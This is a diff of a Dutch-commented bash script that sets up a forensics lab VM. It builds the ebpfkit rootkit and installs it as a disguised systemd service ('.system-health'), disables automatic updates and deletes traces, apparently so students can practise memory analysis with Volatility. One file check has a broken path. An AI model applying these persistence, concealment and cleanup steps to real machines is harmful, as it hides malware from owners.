@@ -8,9 +8,6 @@
 #
 # Wijzigingen t.o.v. origineel:
 #   - Statisch IP 192.168.56.101 (host-only netwerk)
-#   - ebpfkit gestart MET webapp (-w vlag) op poort 8080 voor C2-demo
-#   - Systemd service start ook de webapp
-#   - Firewall (ufw) laat poort 8080 toe vanuit host-only subnet
 #
 # Volgorde:
 #   1. APT repositories aanpassen (Ubuntu 20.04 Focal)
@@ -35,7 +32,6 @@ sudo apt update
 
 echo ""
 echo "=== STAP 2: Dependencies Installeren ==="
-sudo apt update && sudo apt upgrade -y
 sudo apt install -y \
     build-essential \
     clang-11 \
@@ -57,13 +53,16 @@ sudo apt install -y \
     python3 \
     python3-pip \
     golang-go \
-    graphviz \
-    ufw
+    graphviz
 
+hostnamectl set-hostname rootkit
 # Zorg dat clang-11 de standaard clang is
 sudo update-alternatives --install /usr/bin/clang clang /usr/bin/clang-11 100
 sudo update-alternatives --install /usr/bin/llc llc /usr/bin/llc-11 100
 sudo update-alternatives --install /usr/bin/llvm-strip llvm-strip /usr/bin/llvm-strip-11 100
+
+sudo lvextend -l +100%FREE /dev/mapper/ubuntu--vg-ubuntu--lv
+sudo resize2fs /dev/mapper/ubuntu--vg-ubuntu--lv
 
 # go-bindata installeren (vereist door ebpfkit Makefile)
 go get -u github.com/shuLhan/go-bindata/... 2>/dev/null || \
@@ -97,13 +96,6 @@ sudo netplan apply
 echo "Statisch IP ingesteld: ${VICTIM_IP}"
 
 echo ""
-echo "=== STAP 5: Firewall — Poort ${WEBAPP_PORT} Openstellen ==="
-# Alleen bereikbaar vanuit het host-only subnet (192.168.56.0/24)
-sudo ufw allow from 192.168.56.0/24 to any port ${WEBAPP_PORT} proto tcp comment "ebpfkit C2 webapp"
-sudo ufw --force enable
-echo "UFW regel toegevoegd: poort ${WEBAPP_PORT} open voor 192.168.56.0/24"
-
-echo ""
 echo "=== STAP 6: ebpfkit Downloaden en Compileren ==="
 cd /opt
 sudo git clone https://github.com/Gui774ume/ebpfkit.git
@@ -118,15 +110,6 @@ make
 echo "Gebouwde binaries:"
 ls -lh bin/
 
-echo ""
-echo "=== STAP 7: Rootkit Laden (met C2 webapp) ==="
-cd /opt/ebpfkit
-# -w start de ingebouwde webapp op poort 8080 (C2-interface)
-# ebpfkit verbergt zichzelf standaard voor bpf syscall
-sudo ./bin/ebpfkit -w &
-sleep 3
-echo "ebpfkit gestart met webapp (achtergrond PID: $!)"
-echo "C2 webapp bereikbaar op http://${VICTIM_IP}:${WEBAPP_PORT}"
 
 echo ""
 echo "=== STAP 8: Persistentie Instellen ==="
@@ -144,8 +127,7 @@ After=network.target
 
 [Service]
 Type=simple
-# -w: start de ingebouwde webapp (C2-interface) op poort 8080
-ExecStart=/usr/local/bin/.system-health -w
+ExecStart=/usr/local/bin/.system-health
 Restart=always
 RestartSec=5
 
@@ -157,9 +139,23 @@ sudo systemctl daemon-reload
 sudo systemctl enable system-health.service
 sudo systemctl start system-health.service
 echo "Persistentie ingesteld via systemd service: system-health.service"
-echo "C2 webapp actief op http://${VICTIM_IP}:${WEBAPP_PORT}"
 
 echo ""
+echo "=== STAP 8: Kernel versie vast zetten ==="
+# 1. Zet de specifieke 5.15.0-179 packages vast
+sudo apt-mark hold linux-image-5.15.0-179-generic
+sudo apt-mark hold linux-headers-5.15.0-179-generic
+sudo apt-mark hold linux-modules-5.15.0-179-generic
+sudo apt-mark hold linux-modules-extra-5.15.0-179-generic
+sudo apt-mark hold linux-image-generic
+sudo apt-mark hold linux-headers-generic
+
+sudo sed -i 's/APT::Periodic::Update-Package-Lists "1";/APT::Periodic::Update-Package-Lists "0";/' /etc/apt/apt.conf.d/20auto-upgrades
+sudo sed -i 's/APT::Periodic::Unattended-Upgrade "1";/APT::Periodic::Unattended-Upgrade "0";/' /etc/apt/apt.conf.d/20auto-upgrades
+
+sudo systemctl stop unattended-upgrades
+sudo systemctl disable unattended-upgrades
+
 echo "=== STAP 9: ISF-profiel Genereren voor Volatility ==="
 KERNEL_VERSION=$(uname -r)
 echo "Kernelversie: $KERNEL_VERSION"
@@ -176,9 +172,10 @@ echo "deb http://ddebs.ubuntu.com $(lsb_release -cs) main restricted universe mu
 deb http://ddebs.ubuntu.com $(lsb_release -cs)-updates main restricted universe multiverse
 deb http://ddebs.ubuntu.com $(lsb_release -cs)-proposed main restricted universe multiverse" | sudo tee /etc/apt/sources.list.d/ddebs.list
 
-sudo apt install ubuntu-dbgsym-keyring
+
+sudo apt install ubuntu-dbgsym-keyring -y
 sudo apt update
-sudo apt install linux-image-$(uname -r)-dbgsym
+sudo apt install linux-image-$(uname -r)-dbgsym -y
 
 VMLINUX="/usr/lib/debug/boot/vmlinux-${KERNEL_VERSION}"
 SYSTEM_MAP="/boot/System.map-${KERNEL_VERSION}"
@@ -221,33 +218,15 @@ echo "=== STAP 10: Kernel Versie Vastzetten ==="
 # # Geef de student eigenaarschap
 # sudo chown -R student:student /opt/LiME
 # insmod ./lime-$(uname -r).ko "path=/tmp/ram.lime format=lime"
-echo "=== STAP 8: Kernel versie vast zetten ==="
-# 1. Zet de specifieke 5.15.0-179 packages vast
-sudo apt-mark hold linux-image-5.15.0-179-generic
-sudo apt-mark hold linux-headers-5.15.0-179-generic
-sudo apt-mark hold linux-modules-5.15.0-179-generic
-sudo apt-mark hold linux-modules-extra-5.15.0-179-generic
-sudo apt-mark hold linux-image-generic
-sudo apt-mark hold linux-headers-generic
-
-sudo sed -i 's/APT::Periodic::Update-Package-Lists "1";/APT::Periodic::Update-Package-Lists "0";/' /etc/apt/apt.conf.d/20auto-upgrades
-sudo sed -i 's/APT::Periodic::Unattended-Upgrade "1";/APT::Periodic::Unattended-Upgrade "0";/' /etc/apt/apt.conf.d/20auto-upgrades
-
-sudo systemctl stop unattended-upgrades
-sudo systemctl disable unattended-upgrades
 
 echo ""
 echo "=== STAP 11: RAM Dump Maken ==="
-./VBoxManage list runningvms
-./VBoxManage controlvm "ebpfkit" pause
-./VBoxManage debugvm "ebpfkit" dumpvmcore --filename="C:\Users\username\Downloads\memory_dump.elf"
-./VBoxManage controlvm "ebpfkit" resume
+
 
 echo ""
 echo "=== STAP 12: Sporen Verwijderen ==="
 sudo rm -rf /opt/ebpfkit
 sudo rm -rf /tmp/dwarf2json
-sudo rm -f "/tmp/${PROFILE_NAME}"
 
 sudo apt remove -y "linux-image-${KERNEL_VERSION}-dbgsym" 2>/dev/null || true
 sudo rm -f /etc/apt/sources.list.d/ddebs.list
@@ -275,17 +254,6 @@ echo ""
 echo "--- Rootkit actief? ---"
 systemctl is-active system-health.service && echo "OK: ebpfkit service actief" || echo "FOUT: ebpfkit service niet actief!"
 
-echo ""
-echo "--- C2 webapp bereikbaar? ---"
-curl -s --max-time 3 "http://${VICTIM_IP}:${WEBAPP_PORT}" > /dev/null && \
-    echo "OK: Webapp reageert op poort ${WEBAPP_PORT}" || \
-    echo "FOUT: Webapp niet bereikbaar op poort ${WEBAPP_PORT}!"
-
-echo ""
-echo "--- UFW regel aanwezig? ---"
-sudo ufw status | grep "${WEBAPP_PORT}" && echo "OK: Firewall regel actief" || echo "FOUT: Firewall regel ontbreekt!"
-
-echo ""
 echo "--- lsmod (mag niets verdachts tonen) ---"
 lsmod | head -20
 
@@ -294,14 +262,8 @@ echo "--- bpftool (rootkit verbergt zichzelf standaard) ---"
 sudo bpftool prog list 2>/dev/null | head -20 || echo "(bpftool niet beschikbaar of verborgen)"
 
 echo ""
-echo "--- Volatility 3 aanwezig? ---"
-python3 /opt/volatility3/vol.py --help > /dev/null 2>&1 && \
-    echo "OK: Volatility 3 werkt" || \
-    echo "FOUT: Volatility 3 werkt niet!"
-
-echo ""
 echo "--- ISF-profiel aanwezig? ---"
-ls /opt/volatility3/volatility3/symbols/linux/*.json > /dev/null 2>&1 && \
+ls /tmp*.json > /dev/null 2>&1 && \
     echo "OK: ISF-profiel aanwezig" || \
     echo "FOUT: ISF-profiel ontbreekt!"
 
